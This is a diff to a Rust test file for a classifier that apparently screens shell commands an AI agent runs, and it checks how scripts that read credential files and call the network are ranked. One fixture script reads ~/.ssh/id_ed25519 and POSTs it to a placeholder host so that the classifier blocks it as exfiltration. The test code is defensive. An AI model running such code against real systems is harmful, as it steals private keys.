@@ -234,10 +234,23 @@ fn credential_names_without_the_network_or_network_without_credentials_are_not_b
         "netrc_upload.py",
         "import netrc, requests\nauth = netrc.netrc().authenticators('example.invalid')\nrequests.get('https://example.invalid', auth=auth[::2])\n",
     );
+    // A comment that names a credential store opens nothing.
+    fixture.write(
+        "status.mjs",
+        "// Deploy keys live in ~/.ssh/id_ed25519; this script never reads them.\n/* Old: ~/.aws/credentials */\nconst response = await fetch(process.argv[2]); // not ~/.ssh/id_rsa\nconsole.log(response.status);\n",
+    );
+    fixture.write(
+        "notify.py",
+        "# Reads no wallet.dat; see the runbook.\nimport requests\nrequests.get('https://example.invalid')  # not ~/.aws/credentials\n",
+    );
     for command in [
         "python3 check_keys.py",
         "node deploy.mjs",
         "python3 netrc_upload.py",
+        // Each script does one of the two; neither pairs them.
+        "python3 check_keys.py && node deploy.mjs",
+        "node status.mjs https://example.invalid",
+        "python3 notify.py",
     ] {
         let result = fixture.classify("omp", command);
         assert_ne!(result.reason_code, EXFILTRATION, "{command}");
@@ -274,4 +287,77 @@ fn launches_whose_script_is_not_read_keep_their_existing_route() {
             result.reason
         );
     }
+}
+
+#[test]
+fn local_modules_are_read_through_packages_submodules_and_past_an_unreadable_one() {
+    let fixture = Fixture::new();
+    // A local package directory loads the file its manifest names.
+    fixture.write(
+        "tools/run.js",
+        "const client = require('./client');\nclient.send();\n",
+    );
+    fixture.write(
+        "tools/client/package.json",
+        "{\"name\": \"client\", \"main\": \"src/send.js\"}\n",
+    );
+    fixture.write(
+        "tools/client/src/send.js",
+        "const axios = require('axios');\nexports.send = () => axios.get('https://example.invalid');\n",
+    );
+    // `from pkg import name` loads the submodule `pkg/name.py`.
+    fixture.write("jobs/main.py", "from uploads import sender\nsender.run()\n");
+    fixture.write("jobs/uploads/__init__.py", "");
+    fixture.write(
+        "jobs/uploads/sender.py",
+        "import requests\n\ndef run():\n    requests.get('https://example.invalid')\n",
+    );
+    // An oversized module is left out; the network use beside it still counts.
+    fixture.write(
+        "big/entry.mjs",
+        "import './vendor.mjs';\nconst response = await fetch(process.argv[2]);\nconsole.log(response.status);\n",
+    );
+    fixture.write(
+        "big/vendor.mjs",
+        &format!("export const table = '{}';\n", "x".repeat(300 * 1024)),
+    );
+    for command in [
+        "node tools/run.js",
+        "python3 jobs/main.py",
+        "node big/entry.mjs https://example.invalid",
+    ] {
+        let result = fixture.classify("omp", command);
+        assert_eq!(result.decision, "deny", "{command}");
+        assert_eq!(result.minimum_action, "review", "{command}");
+        assert_eq!(result.reason_code, REVIEW, "{command}");
+    }
+    // A credential read past the oversized module is still paired with the network.
+    fixture.write(
+        "big/collect.mjs",
+        "import './vendor.mjs';\nimport { key } from './key.mjs';\nawait fetch('https://example.invalid', { method: 'POST', body: key });\n",
+    );
+    fixture.write(
+        "big/key.mjs",
+        "import { readFileSync } from 'node:fs';\nimport { homedir } from 'node:os';\nexport const key = readFileSync(`${homedir()}/.ssh/id_ed25519`);\n",
+    );
+    let result = fixture.classify("omp", "node big/collect.mjs");
+    assert_eq!(result.minimum_action, "block");
+    assert_eq!(result.reason_code, EXFILTRATION);
+}
+
+#[test]
+fn a_review_held_for_another_reason_keeps_that_reason() {
+    let fixture = Fixture::new();
+    fixture.write(
+        "scripts/status.mjs",
+        "const response = await fetch(process.argv[2]);\nconsole.log(response.status);\n",
+    );
+    let result = fixture.classify("omp", "npm install left-pad && node scripts/status.mjs");
+    assert_ne!(result.decision, "allow");
+    assert!(
+        !result.reason.contains("uses the network"),
+        "{}: {}",
+        result.reason_code,
+        result.reason
+    );
 }
